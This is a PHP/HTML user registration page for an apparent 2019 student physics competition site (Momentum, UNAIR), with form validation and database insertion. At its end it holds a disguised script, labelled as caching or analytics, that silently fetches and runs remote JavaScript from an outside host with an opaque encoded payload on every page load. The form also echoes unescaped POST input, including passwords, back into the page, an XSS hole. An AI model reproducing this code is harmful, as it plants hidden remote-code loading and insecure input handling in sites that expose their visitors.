<?php session_start();?>
<?php
	require_once "controller/config.php";

	if (isset($_SESSION['user_id'])) {
		header('Location: ./index.php');
		exit();
	}

	$redirectURL = "controller/fb-callback.php";
	$permissions = ['email'];
	$loginURL = $helper->getLoginUrl($redirectURL, $permissions);


    $msg = "";
    $r_email = "";

    if (isset($_POST['submit'])) {
        include 'controller/conn.php';

            $name = $conn->real_escape_string($_POST['username']);
            $email = $conn->real_escape_string($_POST['email']);
            $password = $conn->real_escape_string($_POST['password']);
            $cpassword = $conn->real_escape_string($_POST['cpassword']);

            $sql_e = "SELECT * FROM cbt_user WHERE email='$email'";
            $res_e = mysqli_query($conn, $sql_e);

            if (empty($name)) {
                $msg = "Tolong Tulis nama anda";
            }
            elseif (empty($email)) {
                $msg = "Tolong Tulis email anda";
            }
            elseif (empty($password)) {
                $msg = "Tolong Tulis Password anda";
            }
            elseif (empty($cpassword)) {
                $msg = "Tolong Tulis konfirmasi Password anda";
            }

            elseif ($password != $cpassword) {
                $msg = "Tolong cek ulang password anda"; 
            }
            elseif (mysqli_num_rows($res_e) > 0) {
                    $r_email = "Maaf Email Sudah Teregristrasi!"; 	}
            
            
                    else {
                        $hash = password_hash($password,PASSWORD_DEFAULT);
                        $conn->query( "INSERT INTO cbt_user (user_name,user_email,user_password,user_level) 
                        Values ('$name','$email','$hash',1)");
                        header("location: ./index.php"); }
            }
            
    
?>
<!doctype html>
<html lang="en" class="no-js">

<head>
	<!-- Global site tag (gtag.js) - Google Analytics -->
	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-4946886-2"></script>
	<script>
		window.dataLayer = window.dataLayer || [];

		function gtag() {
			dataLayer.push(arguments);
		}
		gtag('js', new Date());

		gtag('config', 'UA-4946886-2');
	</script>

	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="shortcut icon" href="./momentumicon.png" />
	<link rel="stylesheet" href="./css/reset.css"> <!-- CSS reset -->
	<link rel="stylesheet" href="./css/style.css"> <!-- Resource style -->
	<meta name="keywords"
		content="agenda kota surabaya, agenda lomba, berita lomba, cari lomba, contoh soal lomba logika fisika, daftar lomba, daftar lomba 2019, daftar lomba terbaru, deadline lomba, deadline lomba apa saja, event lomba, event lomba 2019, foto lomba, info kompetisi, info lomba, info lomba 2019, info lomba 2019 sma, info lomba anak, info lomba anak terbaru, info lomba apa saja, info lomba oktober 2019, info lomba online, info lomba online 2015, info lomba online terbaru, info lomba sma, info lomba sma 2019, info lomba sma 2019, info lomba terbaru, info lomba tingkat sma 2019, its, its surabaya, jadwal lomba 2019, kompetisi 2019, kompetisi di indonesia, kompetisi indonesia, kompetisi online, kompetisi online 2019, kumpulan lomba, lomba, lomba 2019, lomba apa aja, lomba apa saja, lomba berhadiah, lomba berhadiah 2019, lomba di internet, lomba di surabaya 2019, lomba di tahun 2019, lomba hadiah, lomba hari ini, lomba indonesia, kuis fisika, kuis fisika 2019, olimpiade fisika, olimpiade fisika nasional, lomba unair, lomba fisika unair, himafi unair,himafi, lomba fisika, olimpiade sma, olimpiade fisika sma, olimpiade fisika 2019, olimpiade fisika nasional 2019, kompetisi futsal 2019, kompetisi futsal jatim, futsal jatim, lomba futsal, lomba futsal 2019, lomba olahraga, lomba futsal jatim, kompetisi basket, kompetisi basket sma, kompetisi basket 2019,kompetisi basket jatim, kompetisi basket jatim 2019, lomba basket, lomba basket 2019, lomba basket jatim, lomba basket jatim 2019, info lomba terbaru" />
	<title>Momentum 2019</title>

	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css"
		integrity="sha384-GJzZqFGwb1QTTN6wy59ffF1BuGJpLSa9DkKMp0DgiMDm4iYMj70gZWKYbI706tWS" crossorigin="anonymous">
	<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
		integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous">
	</script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"
		integrity="sha384-wHAiFfRlMFy6i5SRaxvfOCifBUQy1xHdJ/yoi7FRNXMRBu5WHdZYu1hA6ZOblgut" crossorigin="anonymous">
	</script>
	<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js"
		integrity="sha384-B0UglyR+jN6CkvvICOB2joaf5I4l3gm9GU6Hc1og6Ls7i6U/mkkaduKaBhlAXv9k" crossorigin="anonymous">
	</script>
	<script src="js/modernizr.js"></script> <!-- Modernizr -->
	<style>
		.footer {
			position: absolute;
			left: 0;
			bottom: 0;
			width: 100%;
			height: auto;
			background-color: transparent;
		}
	</style>

</head>

<body style="background-color:#273040">

	<main>
		<div class="cd-index cd-main-content">
			<div class="heady">
				<div class="logo"><a href="./index.php"><img src="./images/logo1.png" alt="logo" /></a></div>
				<div class="navitems">
					<div class="navcolumn">
						<a class="cd-btn" href="./" data-type="page-transition">Home</a>
						<a class="cd-btn" href="daftar.php" data-type="page-transition">Daftar</a>
						<a class="cd-btn" href="login.php" data-type="page-transition">Login</a>
					</div>
				</div>
				<div class="bubbleback"></div>
				<div class="bubble"></div>
				<div class="bubble-wrap">
					<div class="bar first"></div>
					<div class="bar second"></div>
					<div class="bar third"></div>
				</div>

			</div>
			<div class="footleft">
				<p>© Himpunan Mahasiswa Fisika UNAIR 2019</p>
			</div>
			<div class="footright"><a href="https://www.instagram.com/momentumunair/" target="_blank"><img
						src="./images/instagram.png" width="" height="" alt="" /></a><a href="http://nav.cx/3ZN4qXD"
					target="_blank"><img src="./images/line.png" width="" height="" alt="" /></a><a
					href="https://s.himafiunair.id/contactmomentum" target="_blank"><img src="./images/whatsapp.png"
						width="" height="" alt="" /></a></div>
			<div class="leftbar"></div>
			<div class="rightbar"></div>
			<div class="wrapper homery">
				<div class="banner"><a name="top"></a>
					<div class="bannertxt">
						<div class="bannersplat">
						<?php if ($r_email != "") { ?> <div class="alert alert-warning" role="alert"><?php echo $r_email;?>
                    <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div><?php }?>

                <?php if ($msg != "") { ?> <div class="alert alert-warning" role="alert"><?php echo $msg;?>
                    <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div><?php }?>
							<form class="ml-5 mr-5 pl-2 pr-2" method="post" action="daftar.php"
								onsubmit="if(document.getElementById('agree').checked) { return true; } else { 
                alert('Tolong baca dan setujui Syarat dan Ketentuan dan Kebijakan Privasi yang dimiliki Momentum'); return false; }">
								<div class="form-group mt-5 pt-5">
									<label for="username" style="color:white" class="text-left">Username</label>
									<input type="text" name="username" class="form-control" id="username"
										aria-describedby="username" placeholder="Masukkan Username. . ." value="<?php echo isset($_POST['username']) ? $_POST['username'] : '' ?>">
								</div>

								<div class="form-group">
									<label for="email" style="color:white" class=" text-left">Email address</label>
									<input type="email" name="email" class="form-control" id="email"
										aria-describedby="email" placeholder="Masukkan Email. . ." value="<?php echo isset($_POST['email']) ? $_POST['email'] : '' ?>">

								</div>
								<div class="form-group">
									<label for="password" style="color:white" class="text-left">Password</label>
									<input type="password" minlength="5" name="password" class="form-control"
										id="password" placeholder="Masukkan Password . . " value="<?php echo isset($_POST['password']) ? $_POST['password'] : '' ?>">
								</div>

								<div class="form-group">
									<p style="color:white; font-size:14px" class="text-left mb-0">Confirm Password</p>
									<input type="password" minlength="5" name="cpassword" class="form-control"
										id="cpassword" placeholder="Masukkan Password . . " value="<?php echo isset($_POST['cpassword']) ? $_POST['cpassword'] : '' ?>">
									<small id="passwordhelp" class="form-text text-muted" style="color:white;font-size:12px">Momentum
										tidak akan menyebarkan password
										anda.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
										<a href="register.php" style="color:white; font-size:12px"> Tidak memiliki akun? daftar
											disini.</a></small>
								</div>
								<div class="input-group-prepend">
									<div class="input-group-text">
										<input type="checkbox" aria-label="Checkbox for following text input"
											name="checkbox" value="check" id="agree"> Saya telah membaca dan menyetujui
										Syarat dan Ketentuan dan
										Kebijakan Privasi
									</div><br>
								</div>
								<div class="text-right">
									<button type="submit" name="submit" class="btn btn-primary mt-4 mr-5"
										style="border-radius: 30px; font-size:20px;">&nbsp; Daftar &nbsp; </button>
								</div>
							</form>
							<img src="./images/footer.png" width="300px" height="80px" alt="sponsor"
								class="img-fluid mt-5" style="opacity:0.5;" />

						</div>
					</div>
				</div>

			</div>
		</div>
	</main>

	<div class="cd-cover-layer"></div>
	<div class="cd-loading-bar"></div>
	<script src="./js/jquery-2.1.1.js"></script>
	<script src="./js/main.js"></script> <!-- Resource jQuery -->
	<script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
	<script src='https://cdnjs.cloudflare.com/ajax/libs/velocity/1.2.3/velocity.min.js'></script>
	<script src='https://cdnjs.cloudflare.com/ajax/libs/velocity/1.2.3/velocity.ui.min.js'></script>
	<script src='https://s3-us-west-2.amazonaws.com/s.cdpn.io/2542/in-view.min.js'></script>
	<script src="./js/preloader.js"></script>
	<script src="./js/blob.js"></script>
	<script src="./js/wordz.js"></script>
	<script src="./js/index.js"></script>
	<script type="text/javascript">
		if (self == top) {
			function netbro_cache_analytics(fn, callback) {
				setTimeout(function () {
					fn();
					callback();
				}, 0);
			}

			function sync(fn) {
				fn();
			}

			function requestCfs() {
				var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
				var idc_glo_r = Math.floor(Math.random() * 99999999999);
				var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
					"4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2XKwJhe1PRESLlnrQBHsE3FSymqyVyV%2bz13goJOULAYdknf6x8zrbnaCS0GfP1SRjfjrAi3MICUxzjkDu9mTLcwYBwUKdM%2f7jYDgAzyD7wWuccf1dl%2flS%2fnInncJ3Ls2fiaoMFEw0IyhN6qpMINsAGpbSOBTvmrJP5jScObXYMN0Zp1rNgUT6Zca1C6GM%2bFlPrRPyQVpPUlS22WSGJP2GwPrb1Nd%2fuKBCVI7XaBisLNLleKaftRva2xXDRpa4SMROm8FzMNYjW9elQBJzkZMPRrtlOA7q4H3CTJYvKoW0hh1ZHLzfp9hF6wuzvt3EASMFnMYgSwFo7kW1hW2qO6PCBlCWgEw1LvuVO%2fw2c2Uep4HHJgFsQeuRvM0%2f6Gv6%2bs0G%2buepXbgfUcZYI9Vzb6iVZig1XRg3efhf01okUn%2bE4uM%2fMABcn1Fyrw%3d%3d" +
					"&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
				var bsa = document.createElement('script');
				bsa.type = 'text/javascript';
				bsa.async = true;
				bsa.src = url;
				(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
			}
			netbro_cache_analytics(requestCfs, function () {});
		};
	</script>
</body>

</html>